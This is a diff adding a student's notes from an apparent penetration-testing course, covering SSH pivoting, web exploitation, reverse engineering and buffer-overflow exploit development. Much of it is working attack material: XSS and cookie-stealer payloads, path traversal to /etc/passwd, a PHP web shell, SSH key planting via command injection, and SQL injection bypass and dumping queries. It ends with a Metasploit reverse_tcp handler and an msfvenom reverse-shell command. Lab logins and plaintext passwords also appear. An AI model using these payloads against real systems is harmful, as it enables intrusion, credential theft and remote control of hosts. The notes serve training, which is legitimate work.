@@ -1,0 +1,261 @@
+##NIX OPS RDP AUTHENTICATION
+    FLOAT:10.50.150.119
+        student:password
+##WIN OPS RDP AUTHENTICATION
+    FLOAT:10.50.157.60
+        student:password
+    
+
+Phase  1:
+    Mission goals and targets
+    Scope of mission
+    RoE
+        Black Box (No Knowledge)
+        White Box (Full Knowledge)
+        Grey Box (Some Knowledge)
+
+Phase 2: RECON
+
+Phase 3: Footprinting
+
+Phase 4: Exploitation/Initial Access
+
+Phase 5: Post-Exploitation
+    Persistence
+    Privileges
+    Tradecraft
+    Exfiltrate data
+
+Phase 6: Document/Report mission details
+
+
+# Authenticate to next box
+SSH -MS /tmp/jmp USER@IP 
+#From next box, ping sweep
+    for i in {1..255}; do (ping -c 1 {first_three_octets).$i | grep "bytes from" &); done
+#After host enum, portscan with nmap
+# Dyanmic portforwarding from linops    
+    ssh -S /tmp/jmp jmp -O forward -D 9050
+#verify socket file
+    ss -ntlp | grep [<dyanmic_high_port>]
+    ls /tmp
+#Ater host enum, connect to ports and host
+ssh -S /tmp/jmp jmp -O  forward -L  <RHP1>:10.208.50.42:22 -L <RHP2>:10.208.50.42:80
+    ssh -S /tmp/jmp jmp -O cancel (connection you want to cancel)
+
+# How to pivot again 
+ssh -MS /tmp/jmp2  -L user@127.0.0.1:<RHP1>
+ssh -S /tmp/jmp jmp -O cancel -D 9050
+ssh -S /tmp/jmp jmp2 -O forward -D 9050
+
+
+
+
+#CREDENTIALS FOR CTF/ JUMP BOX
+    ssh demo1@10.50.13.244 -L 2222:10.208.50.61:80
+(in browser) 127.0.0.1:2222/classinfo.html
+FFLL-201-M
+    Stack: 1
+    Username: DAFA-201-M
+    Pass: kkV1hrepsHqu
+    Jump: 10.50.16.93
+-----------------------------------------------------------------------------------------------WEB EXPLOITATION---------------------------------------------------------------------------------------------------------
+
+
+
+#GET REQUEST FOR HTTP
+http://10.50.x.x/path/pathdemo.php?myfile=demo1
+    #Use Console to modify/create functions, can also search for fuctions with open parenthesis 
+#STORED XSS. 
+    <img src="http://invalid" onerror=:widnow.open('http://<IP>:<port>)
+    <scipt>alert('XSS');</script>
+            #Pulled from slides
+                <img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
+
+
+    #Cookie stealer, be mindful of where our listener is. 
+        <script>document.location="http:127.0.0.1:<RHP>/?username=" + document.cookie;</script?>
+    #
+        nc -l 127.0.0.1 <RHP1>
+    #Directory Traversal/Path Traversal -- Utilizes relative paths to manipulate a server-side file path
+        #example
+            http://<IP>:<port>/view_image.php?file=../../etc/passwd
+                #can be done for websites that utilize HTTP POST/GET methods. Depends on where user input is being read from.
+
+    #Malicious upload, needs an upload and location of a file
+        <HTML><BODY>
+        <FORM METHOD="GET" NAME="myform" ACTION="">
+        <INPUT TYPE="text" NAME="cmd">
+        <INPUT TYPE="submit" VALUE="Send">
+        </FORM>
+        <pre>
+        <?php
+        if ($_GET['cmd']) {
+        system($_GET['cmd']);    
+        }
+        ?>/var/ww
+        </pre>
+        </BODY></HTML>
+    #SSH-KEYGEN
+        ssh-keygen -t rsa -b 4096
+        no pass phrase
+
+    ## from remote host
+        # make .ssh directory in user's $HOME
+            ; mkdir var/www/.ssh
+            ; ls -la /var/www
+    #Get my key (copy ALL of it)
+        cat /home/student/.ssh/id_rsa.pub
+    #upload key 
+    ; echo "" > /var/www/.ssh/authorized_keys
+    : cat /var/www/.ssh/authorized_keys
+    #You now have ssh authenticaton. Dew it
+        ssh -i .ssh/id_rsa user@<ip>
+-----------------------------------------------------------------------------------------------WEB EXPLOITATION(EP2: SQL INJECTION)---------------------------------------------------------------------------------------------------------
+
+        #AUthentication bypass with SQL INJECTION
+            Username: 'OR 1='1
+            Password: 'OR 1='1
+                #If you want to see which field specifically is broken, try the injection on only one field.
+            #Inspect > Network > post > request (NOT REQUEST HEADERS, Requests is another tab when you click POST) > raw(radio button)
+                #Paste raw string to the end of url   
+                x.x.x.x:xxxx/login.php?<raw_string>
+        #4 steps to SQL Injection (POST)
+            #1. Identify vulnerable field(s)
+                {field}'OR 1='1
+                DEMO EX: Audi' OR 1='1
+            #2. Identify number of columns
+                {vuln_field}' UNION SELECT (number,of,columns)#
+                 DEMO EX: Audi' UNION SELECT (1,2,3,4)
+                    #some queries have hidden columns, may need to add a few more than you see. 
+            #3. Inject Golden Statement
+                 {vuln_field}' UNION SELECT table_schema,(missingcolumn),table_name,column_name(end_index_of_columns) FROM Information_schema.columns#
+                 DEMO EX: Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM Information_schema.columns#
+            #4. Craft queries   
+                #Show databases by only replacing column names with numbers
+                    {vuln_field}' UNION SELECT table_schema,(number,of,columns)FROM Information_schema.columns#
+                    DEMO EX: Audi' UNION SELECT table_schema,2,3,4,5 FROM Infromation_schema.columns
+                            #You'll find a column/field that looks fishy, enumerate on that
+                                 {vuln_field}' UNION SELECT (sus,table),(number,of,columns)FROM (suscolum).columns#
+                                 Audi' UNION SELECT name,2,pass,4,5 FROM session.user #
+                                        ## Look at version
+                                                Audi' UNION SELECT @@version,2,pass,4,5 FROM session.user #
+        #4 Steps to SQL Injection (GET) use URL Bar
+            #1. Identify vulnerable field(s) by adding '?selection=2 or 1=1'
+                <URL>/uniondemo.php?selection={number} or 1=1
+            #2. Identify number of columns
+                <URL>/Uniondemo.php?selection=1 UNION SELECT 1,2,3
+                    ##If columns are in a different order when you get results, rearrange them to fix it
+            #3. Golden Statement
+                <URL>/Uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM Information_schema.columns
+                    ## For the purpose of this exercise column_name and table_name are swapped due to the correct order for Uniondemo being 1,3,2.
+            #4 Craft queries
+                                column_name,column_name,column_name FROM database.table
+                Selection=2 UNION SELECT table_schema,column_name,table_name FROM Information_schema.columns
+----------------------------------------------------------------------------------------REVERSE ENGINEERING-----------------------------------------------------------------------------------------------------------------------------------------
+        Brett Champan — 'In order to move forward, one must first look back.'
+
+    Stack  -- contiguous register that can used by either programmer or user to store data or a memory llocation address
+    Unallocated Storage
+    Heap -- allocated and deallocated memory
+    Data
+    Text
+        rax- the first return register
+        rbp - the base pointer that keeps track of the base of the stack
+        rsp - the stack pointer that points to the top of the stack
+        RIP/EIP/IP holds address for next instruction to be executed
+
+    EXPLOIT ANALYSIS (?)
+        strings.exe -a -nobanner .\(malware.exe) | findstr /i mz
+        strings.exe -a -nobanner .\(malware.exe) | select -first 10            
+    #Ghidra
+        New Project
+        Click file > import file
+        By default: functions, disassembler, decompiler
+        #Start from THE END OF THE PROGRAM, SEARCH FOR "SUCCESS" etc.
+            search > strings: search for desired strings, double click results to see C
+    #Patching
+        Follow code, working backwards, identify potential ins or values to be changed
+        Right on instruciton,  click patch instruction, then put new value in
+        File > Export Program > format PE > change location > run it
+
+----------------------------------------------------------------------------------------EXPLOIT DEVELOPMENT-----------------------------------------------------------------------------------------------------------------------------------------
+## Installation of Peda Plugin
+    git clone https://github.com/longld/peda.git ~/peda
+     echo "source ~/peda/peda.py" >> ~/.gdbinit
+# Common Commands
+    disass <FUNCTION>   #   Disassemble portion of the program
+    info <...>  #   Supply info for specific stack areas
+    x/256c $<REGISTER>  #   Read characters from specific register
+    break <address>  #   Establish a break point
+# Exploit DEV Linux
+    #Static Analysis
+        file <file>     #Gets file type
+        strings <file>  
+        ls -lisha         #Check perms
+    #Behavioral Analysis
+        chmod u+x <file>
+        ./<file>
+    #Dynamic Analysis
+        ##Dynamic Analysis is behavioral analysis but for nerds. The difference is that the intent of dynamic analysis is to use the process as not intended.
+        ##use command substitution
+            ./<file> $(echo "1234")
+            ./<file> `echo 1234`     ##back ticks, NOT single quotes (next to 1 on the keyboard)
+        #Simulate user input
+        <file> <<<$(echo "1234")
+        #Instructor walks you through making a python script, the name is gunnyrungy.py
+        #GDB
+            gdb ./<file>
+            # To go back to shell CLI
+                CLI
+            #To exit (shell)
+                exit
+            # Important commands
+                Info functions        #Find functions of interest such as gets@plt or puts@plt
+
+                psdisass main          #Disassemble with the peda plugin -- look for things like <getuserinput>
+                disass main            #Standard gdb plugin for disassemble -- look for red things like <gets@plt>
+
+                file or file <file>     #checks/sets the exe
+            
+        #Run script
+            run <<<$(python <./script.py>)
+        #Pinpoint EIP by using wiremask - buffer overflow pattern generator 
+                -- see notes in gunnyrungy.py on linops --
+        #After pinpointing the EIP, find the JMP ESp
+            shell > env - gdb ./<file>
+            unset env LINES; unset env COLUMNS
+                    ## show env to verify should see nothing
+            run or start, then ctrl + c to stop.
+            info proc map
+            find /b <1st address after heap>,<last>,0xff,0xe4
+                ##Take the first five addresses and convert them to little endian
+sudo -l ## tells the user what perms they have as sudo
+sudo ./inventory.exe <<<$(gunnyrungy.py script) #runs the inventory exe script on sudo but also gunnyrungy, giving me permission to sudo built-in commands to the python script I made.
+            ###############################################EXPLOITING A WINDOWS SERVER###################################################################
+      #Using Windows to find the port an exe is using
+            Get-process | findstr /i <file>   
+            Netstat -anop tcp | findstr <PID>
+
+      #ON LINOPS
+            #Utilize the socketbanger.py script
+     #Dynamic/Disass
+            #Immunity > File > Open > <FILE>
+             #Check Status > "Paused" or "Running", use rewind and play buttons From Wiremask, generate string. Run the script, check EIP in immunity
+            #Throw EIP value into wiremask to get our offset
+                    ##You can also lowkey just restart the process manually and reload Debugger with the same exe but that's more work
+            #FIND JMP ESP
+                #Find unprotected DLLS
+                    !mona modules 
+                    !mona jmp -r esp -m "<vuln.dll>"
+                    Window > Log Data > Highlight > right click > address value   
+                        #Convert to Little Endian for socketbanger
+            #After forming script, need to get a meterpreter session
+                msfconsole
+                use multi/handler
+                payload: windows/meterpreter/reverse_tcp
+                LHOST 0.0.0.0
+                LPORT 4444
+                exploit
+            #Shell code (THIS IS ONE LINE), lhost is LINUX OPSTATION
+            msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.150.119 lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python
